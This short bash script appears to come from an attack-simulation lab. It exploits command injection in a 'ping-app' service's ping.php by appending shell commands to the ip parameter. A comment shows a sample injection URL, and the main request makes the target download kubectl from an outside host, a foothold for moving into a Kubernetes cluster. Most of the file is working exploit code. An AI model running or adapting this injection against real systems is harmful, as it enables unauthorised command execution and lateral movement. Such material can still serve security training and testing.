#!/usr/bin/env bash

source "$(dirname "$0")/general.sh"

echo "[+] Testing command injection on ${service_map[ping-app]}"

# http://209.38.112.187:8890/ping.php?ip=1.1.1.1%3Bls+-la+%2F

echo "[+] Trying to download kubectl"
output=$(curl -s "http://${service_map[ping-app]}/ping.php?ip=1.1.1.1%3Bcurl+-LO+"https%3A%2F%2Fdl.k8s.io%2Frelease%2F%24%28curl+-L+-s+https%3A%2F%2Fdl.k8s.io%2Frelease%2Fstable.txt%29%2Fbin%2Flinux%2Farm64%2Fkubectl"")
if [ $? -ne 0 ]; then
    echo "[-] Failed to execute command injection attack"
    exit 1
fi

if echo "$output" | grep -q "total"; then
    echo "$output" | sed 's/<[^>]*>/\n/g' | tr -s ' ' | sed '/^[[:space:]]*$/d'
    echo "[+] Command injection attack executed successfully"
else
    echo "[-] Command injection attack failed"
fi


